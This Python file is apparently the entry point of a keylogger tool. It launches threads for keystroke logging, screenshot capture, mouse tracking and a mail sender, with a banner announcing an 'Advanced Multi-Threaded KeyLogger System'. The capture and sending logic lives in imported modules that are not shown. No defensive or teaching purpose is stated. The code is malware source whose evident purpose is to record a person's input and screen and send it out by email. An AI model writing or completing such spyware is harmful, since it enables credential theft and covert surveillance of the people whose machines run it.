
import time
import platform
import getpass
from datetime import datetime
from src.keylogger import AdvancedKeyLogger
from src.screenshot import ScreenshotCapturer
from src.mail_sender import MailSender
from src.mouse_tracker import MouseTracker

def print_banner():
    print("\n" + "=" * 60)
    print("          🔐 Advanced Multi-Threaded KeyLogger System")
    print("=" * 60)
    print(f"👤 User       : {getpass.getuser()}")
    print(f"💻 System     : {platform.system()} {platform.release()}")
    print(f"🕒 Start Time : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("=" * 60 + "\n")

def main():
    print_banner()

    logger = AdvancedKeyLogger()
    logger.start_in_thread()

    capturer = ScreenshotCapturer()
    capturer.start_in_thread()

    mailer = MailSender()
    mailer.start_in_thread()

    mouse_tracker = MouseTracker()
    mouse_tracker.start_in_thread()

    try:
        while True:
            time.sleep(10)
    except KeyboardInterrupt:
        print("\n[!] Logging system stopped manually.")

if __name__ == "__main__":
    main()
